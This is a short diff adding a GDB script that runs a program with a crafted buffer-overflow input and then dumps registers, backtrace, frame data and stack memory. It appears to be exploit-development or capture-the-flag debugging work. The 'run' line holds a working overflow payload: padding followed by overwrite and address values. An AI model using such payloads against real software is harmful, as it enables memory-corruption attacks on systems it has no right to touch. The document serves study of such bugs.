@@ -1,0 +1,19 @@
+b main
+run $(python -c 'print "\x41"*1024+"\xfc\xff\xff\xff"+"\xfc\xff\xff\xff"+"\x42"*4+"\x48\x97\x04\x08"+"\x97\xd4\xff\xff"')
+printf "Info Registers EIP:"
+x/i $eip
+printf "Backtrace:"
+bt
+printf "Info Frame:"
+info frame
+printf "Display Strings EIP:"
+x/s $eip
+printf "Display 32 Hex ESP:"
+x/128xw $esp
+printf "Info ALL Registers:"
+i r
+printf "Display 32 Hex Ptr EIP:"
+x/32xw *$eip
+printf "Display Stats Proc"
+info proc stat
+
